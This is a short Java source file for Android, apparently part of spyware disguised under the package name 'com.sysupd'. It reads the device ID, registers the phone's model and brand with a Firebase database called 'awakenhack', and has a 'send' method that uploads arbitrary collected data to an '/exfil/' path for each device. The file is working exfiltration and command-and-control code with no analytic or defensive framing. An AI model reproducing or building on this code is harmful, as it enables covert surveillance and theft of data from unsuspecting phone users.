package com.sysupd;

import android.content.Context;
import android.provider.Settings;
import java.net.HttpURLConnection;
import java.net.URL;

public class Fb {
    static String DEV = "";
    static String BASE = "https://awakenhack-default-rtdb.firebaseio.com";

    public static void init(Context ctx) {
        DEV = Settings.Secure.getString(ctx.getContentResolver(), "android_id");
        registerDevice();
    }

    static void registerDevice() {
        new Thread(new Runnable() {
            public void run() {
                String url = BASE + "/devices/" + DEV + ".json";
                String body = "{\"model\":\"" + android.os.Build.MODEL +
                    "\",\"brand\":\"" + android.os.Build.BRAND +
                    "\",\"online\":true,\"ts\":" + System.currentTimeMillis() + "}";
                http(url, "PUT", body);
            }
        }).start();
    }

    public static void send(final String type, final String data) {
        new Thread(new Runnable() {
            public void run() {
                String url = BASE + "/exfil/" + DEV + "/" +
                    System.currentTimeMillis() + ".json";
                String body = "{\"type\":\"" + type + "\",\"data\":" + data +
                    ",\"ts\":" + System.currentTimeMillis() + "}";
                http(url, "PUT", body);
            }
        }).start();
    }

    static String http(String urlStr, String method, String body) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(urlStr).openConnection();
            c.setRequestMethod(method);
            c.setRequestProperty("Content-Type", "application/json");
            if (body != null) {
                c.setDoOutput(true);
                c.getOutputStream().write(body.getBytes());
                c.getOutputStream().close();
            }
            return "ok";
        } catch (Exception e) { return null; }
    }
}
